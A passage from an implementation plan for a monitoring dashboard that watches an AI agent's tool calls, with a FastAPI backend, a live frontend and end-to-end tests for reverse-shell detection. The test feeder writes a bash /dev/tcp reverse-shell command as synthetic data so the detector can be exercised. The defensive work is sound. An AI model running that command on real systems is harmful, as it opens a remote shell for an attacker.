cd monitor && git add -A && git commit -q -m "feat(monitor): FastAPI app, auth, REST, WS, status"
```

---

### Task 10: Entry point + launch script + README

**Files:**
- Create: `monitor/backend/main.py`, `monitor/run-monitor.sh`, `monitor/README.md`
- Test: `monitor/tests/test_main_smoke.py`

**Interfaces:**
- Consumes: everything.
- Produces: `main.build() -> (app, config)` that wires config→store→hub→collector→app; `run-monitor.sh` runs uvicorn.

- [ ] **Step 1: Write the failing smoke test**

`monitor/tests/test_main_smoke.py`:
```python
import os
def test_build_app(tmp_path, monkeypatch):
    cfg = tmp_path/"c.yaml"
    cfg.write_text("basic_auth: {username: admin, password: x}\n"
                   "events_db: %s\n" % (tmp_path/'e.db'))
    monkeypatch.setenv("MONITOR_CONFIG", str(cfg))
    from backend import main
    app, config = main.build()
    assert app is not None and config.auth_password == "x"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_main_smoke.py -v`
Expected: FAIL (`ModuleNotFoundError: backend.main`).

- [ ] **Step 3: Implement `backend/main.py`**

```python
import asyncio
from backend import config as config_mod
from backend.store import Store
from backend.hub import Hub
from backend.collector import Collector
from backend.app import create_app

def build():
    cfg = config_mod.load()
    store = Store(cfg.events_db)
    hub = Hub()
    collector = Collector(cfg, store, hub)
    app = create_app(cfg, store, hub, collector=collector)
    return app, cfg

app = None
def get_app():
    global app
    if app is None:
        app, _ = build()
    return app
```

- [ ] **Step 4: Write `run-monitor.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
python3 -m pip install -q -r requirements.txt
export MONITOR_CONFIG="${MONITOR_CONFIG:-./config.yaml}"
exec python3 -m uvicorn "backend.main:get_app" --factory \
  --host "$(python3 -c 'from backend.config import load;print(load().bind_host)')" \
  --port "$(python3 -c 'from backend.config import load;print(load().bind_port)')"
```
`chmod +x run-monitor.sh`.

- [ ] **Step 5: Run smoke test to verify it passes**

Run: `cd monitor && python -m pytest tests/test_main_smoke.py -v`
Expected: PASS.

- [ ] **Step 6: Write `README.md`** (deliverable summary from spec §14)

Include: data sources used, how to start (`./run-monitor.sh`), URL/port (`http://<host>:8787`), how the collector works, DB location (`monitor/events.db`), config options, reverse-shell detection explanation, and **how to add a detection rule** (append a dict to `backend/rules.py::REVERSE_SHELL_RULES`).

- [ ] **Step 7: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): entry point, launch script, README"
```

---

### Task 11: Frontend — HTML/CSS shell, session sidebar, live WS

**Files:**
- Create: `monitor/web/index.html`, `monitor/web/styles.css`, `monitor/web/app.js`
- Test: manual (browser) + `tests/feeder.py` (Task 13)

**Interfaces:**
- Consumes: `/api/sessions`, `/ws?after_seq=`, `/api/sessions/{id}/events`.
- Produces: a working dark dashboard shell with live-updating sidebar and LIVE/RECONNECTING indicator.

- [ ] **Step 1: Build `index.html`** — dark SOC layout: header (`Goose Activity Monitor` + `● LIVE`/`● RECONNECTING` + session/alert counters), left `#sidebar`, right `#main` with a sticky-header `<table id="events">` and a filter `<tr>` row, plus an event-detail `<dialog id="detail">`. Load `styles.css` and `app.js` from `/static/`.

- [ ] **Step 2: Build `styles.css`** — dark theme (`#0d1117` bg, `#e6edf3` text), monospace (`ui-monospace`) for command/response cells, sticky `thead`, tier/severity color chips (LOW green, MEDIUM amber, HIGH orange, CRITICAL red), `.alert-row` keyframe `pulse` red animation (the ONLY pulsing element), resizable `th` (`resize:horizontal; overflow:auto` + a drag handle), compact row density.

- [ ] **Step 3: Build `app.js` core** — `connectWS()` opening `/ws?after_seq=<maxSeq>` with exponential-backoff auto-reconnect; on message `kind:"session"` add/update sidebar tab; `kind:"event"` append to in-memory `events[sessionId]` and, if the session is selected, to the table; track `maxSeq`; toggle `● LIVE`/`● RECONNECTING`. `loadSessions()` populates the sidebar via REST on startup. Session-tab click → `selectSession(id)` loads history via `/api/sessions/{id}/events` then renders.

- [ ] **Step 4: Manual verify** — run `./run-monitor.sh`, open `http://localhost:8787`, log in; confirm sessions from the real `sessions.db` appear in the sidebar with `id_keyword` labels and the indicator shows ● LIVE.

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): frontend shell, sidebar, live websocket"
```

---

### Task 12: Frontend — event table, expand/collapse, detail modal, filters, column persistence

**Files:**
- Modify: `monitor/web/app.js`, `monitor/web/styles.css`, `monitor/web/index.html`

**Interfaces:**
- Consumes: `wildcard`-equivalent client matcher; `/api/events/{event_id}`.
- Produces: full table behavior per spec §8.

- [ ] **Step 1: Render rows** — columns Date / Command / Explanation / Response / Error / External Connection. Date formatted `YYYY-MM-DD HH:MM:SS.mmm` in local tz from `timestamp_ms`. Command cell: collapsed preview (first ~80 chars) with `▶`; click expands full command; for structured args show `Tool: <tool>` + pretty-printed JSON. Response cell: `▶ N characters` when long; expand lazy-renders stdout/stderr/exit/http; virtualize (render on expand only). Error/External badges with INTERNAL/EXTERNAL/UNKNOWN and `source` distinction (referenced shown dimmed/italic). **Redaction:** on load, fetch `GET /api/config`; if `redaction_enabled`, run displayed command/response text through a `redact(text)` helper that masks `Authorization: <val>`, `api[_-]?key=<val>`, `token=<val>`, and `Bearer <val>` (raw stays in DB; masking is display-only). A UI toggle lets the operator flip redaction on/off client-side.

- [ ] **Step 2: Reverse-shell rows** — if `security_alerts` non-empty: add `.alert-row` (pulsing red) + red indicator + `⚠ REVERSE SHELL SUSPECTED` badge with reason + destination; row links to detail modal.

- [ ] **Step 3: Client wildcard matcher** — port `matches(pattern,text)` from Task 1 to JS (`*`→`.*`, `?`→`.`, anchored; else substring; case-insensitive). Per-column filter inputs in the header filter row + global search box + quick-filter buttons (ALL/COMMANDS/MODEL/TOOLS/NETWORK/ERRORS/ALERTS). All combine with AND; re-render on input without reload. (Also pass `f_<col>` to REST for server-side prefilter on history loads.)

- [ ] **Step 4: Detail modal** — open on row click: event id, session id, timestamp, event type, tool, full command, full arguments (JSON), stdout, stderr, exit code, http status, destinations, security detections, raw JSON. Copy buttons per field (`navigator.clipboard`).

- [ ] **Step 5: Column persistence** — make `th` drag-resizable; persist `{colWidths, colOrder}` to `localStorage["monitor.columns"]`; restore on load; a `Reset columns` button clears the key. Verify widths survive a full page reload and browser restart.

- [ ] **Step 6: Manual verify against real data** — select the `20260816_11_asus_router_pentest` session (599 messages, large outputs); confirm expand/collapse, virtualization on big responses, per-column wildcard filters (`f_command=*nmap*`, `*:443` in External), and that column widths persist after refresh.

- [ ] **Step 7: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): event table, filters, detail modal, column persistence"
```

---

### Task 13: Test feeder + reverse-shell E2E + final verification

**Files:**
- Create: `monitor/tests/feeder.py`
- Create: `monitor/tests/test_e2e_reverse_shell.py`

**Interfaces:**
- Produces: `feeder.py` — writes synthetic sessions/messages into a throwaway sqlite in the Goose schema AND appends audit lines, so the collector ingests a controlled stream (multiple sessions, long command, 14k-char response, exit-1 error, HTTP 403, external EXTERNAL/INTERNAL, and a reverse-shell command).

- [ ] **Step 1: Write `feeder.py`** — CLI that, given a target goose-db path + audit-log path, inserts: session `demo_1` "Reverse Shell Test", a benign `nmap` tool_call (INTERNAL), a `curl https://example.com` (EXTERNAL referenced), a `false` (exit 1) error, a response with 14,293 chars, and a `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1` tool_call. Point `config.yaml` at these paths to drive the live UI.

- [ ] **Step 2: Write `test_e2e_reverse_shell.py`** — build a Store+Collector against a feeder-generated goose db + audit log; `poll_once()`; assert the reverse-shell event is stored with `severity in (HIGH,CRITICAL)`, `destination == "10.0.0.5:4444"`, the exit-1 event has `error == "exit code: 1"`, and the EXTERNAL connection is classified `EXTERNAL`/`source=referenced`.

```python
import json, sqlite3
from backend.config import Config
from backend.store import Store
from backend.hub import Hub
from backend.collector import Collector
from tests import feeder

def test_reverse_shell_end_to_end(tmp_path):
    g = str(tmp_path/"g.db"); a = str(tmp_path/"audit.log")
    feeder.populate(g, a)
    cfg = Config(sessions_db=g, audit_log=a, events_db=str(tmp_path/"e.db"), auth_password="x")
    store = Store(cfg.events_db); Collector(cfg, store, Hub()).poll_once()
    evs = store.query_events(session_id="demo_1", limit=1000)
    rs = [e for e in evs if e["security_alerts"]]
    assert rs and rs[0]["security_alerts"][0]["severity"] in ("HIGH","CRITICAL")
    assert rs[0]["security_alerts"][0]["destination"] == "10.0.0.5:4444"
    assert any(e["error"] == "exit code: 1" for e in evs)
```

- [ ] **Step 3: Run the full suite**

Run: `cd monitor && python -m pytest -v`
Expected: ALL PASS.

- [ ] **Step 4: Live verification checklist** (manual, against real Goose)
Point `config.yaml` at the real `sessions.db` + `audit.log`, run `./run-monitor.sh`, and verify: multiple sessions in sidebar; session switching; long commands expand; long responses virtualize; exit-code and HTTP 4xx/5xx errors show; EXTERNAL vs INTERNAL vs UNKNOWN badges; live updates when a new Goose session runs; browser reconnect (kill/restart server → ● RECONNECTING → recovers missed events); reverse-shell demo row pulses red. Then run the feeder to exercise the reverse-shell path on demand.

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "test(monitor): feeder + reverse-shell e2e + final verification"
```

---

## Self-Review

**Spec coverage:**
- §2 data sources → Tasks 7, 8 (sessions.db RO reader, audit.log tailer, correlation). ✓
- §3 architecture/components → Tasks 5–10. ✓
- §4 event schema (+ message events, thinking-drop) → Task 5. ✓
- §5 sessions/labels/status → Tasks 8 (label/slug), 9 (`compute_status`, incl. inferred COMPLETED). ✓
- §6.1 reverse-shell scoring → Task 4. §6.2 error classification → Task 3. §6.3 external connections → Task 3. §6.4 explanation → Task 2. ✓
- §7 API (REST + WS replay/resume) → Task 9. ✓
- §8 frontend (table, date ms, expand/collapse, alerts, per-column wildcard filters, column persistence, detail modal, reconnect) → Tasks 11, 12. ✓
- §9 storage/indexes/retention/performance (seq, pagination, virtualization) → Tasks 6, 9, 12. ✓
- §10 security (LAN bind, basic auth, no-empty-password, read-only, no exec, redaction) → Tasks 0, 9; **redaction UI toggle** implemented in Task 12 Step 1 (apply `config.redaction_enabled` mask to displayed command/response) — added here as an explicit sub-step. ✓
- §11 config → Task 0. ✓
- §12 testing → Tasks 2–9 unit + Task 13 feeder/E2E + live checklist. ✓
- §13 file layout → matches Tasks 0–13. ✓
- §14 deliverable summary → Task 10 README. ✓

**Placeholder scan:** No "TBD/TODO"; all code steps contain real code. The two known inline fixes are called out explicitly (Hub `self._subs` name; normalizer text-branch `event_id`).

**Type consistency:** `explain(tool, arguments)`, `external_connections(tool, arguments, command)`, `classify_error(exit_code, is_error, decision, stdout, stderr, tool)`, `scan_reverse_shell(command, stdout, stderr, connections)`, `MessageState.feed(row)->list`, `Store.insert_event(ev)->seq`, `Store.query_events(session_id, after_seq, limit, filters)`, `compute_status(...)`, `AuditIndex.match(tool, arguments, ts_ms)` are used consistently across tasks.

**Redaction note:** add to Task 12 Step 1 — when `config.redaction_enabled`, the frontend receives a `redaction` flag via a `GET /api/config` (tiny addition to Task 9) and masks `Authorization:`, `api_key`, `token`, bearer patterns in displayed text; raw remains in DB.
